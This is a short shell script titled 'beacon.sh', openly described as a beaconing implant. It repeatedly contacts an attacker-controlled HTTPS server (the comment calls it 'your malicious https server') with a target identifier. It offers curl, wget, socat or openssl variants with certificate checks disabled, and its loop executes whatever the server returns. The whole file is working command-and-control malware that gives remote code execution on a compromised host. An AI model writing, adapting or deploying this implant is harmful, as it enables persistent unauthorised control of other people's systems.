#!/bin/sh
#
# beacon.sh
# Beaconing implant
# By J. Stuart McMurray
# Created 20160221
# Last Modified 20160221

set -e

# Change the below variable to point to your malicious https server
CBADDR="192.0.2.1:4444"

# This should be set to something which identifies this particular target
TGT="host01"

# How many seconds to wait between failed beacons
WAIT=300

# Uncomment one of the below lines depending on whether the target has curl,
# wget, socat or openssl.  You may need to get creative if the target has none
# of the above.

# PLEASE NOTE NOT ALL OF THESE HAVE BEEN TESTED.  THIS SCRIPT WILL BE UPDATED
# AS EACH OF THESE ARE TESTED.

# curl -- Untested
#C="curl -k -s https://${CBADDR}/${TGT}"
# wget -- Untested
#C="wget -q https://${CBADDR}/${TGT}"
# socat -- Untested
#C="(printf \"GET /${TGT} HTTP/1.0\r\n\r\n\";sleep 10) | socat openssl:${CBADDR},verify=0 STDIO"
# openssl -- Untested
#C="(printf \"GET /${TGT} HTTP/1.0\r\n\r\n\";sleep 10) | openssl s_client -verify false -connect ${CBADDR}"

while :; do
        $($C) || sleep $WAIT
done
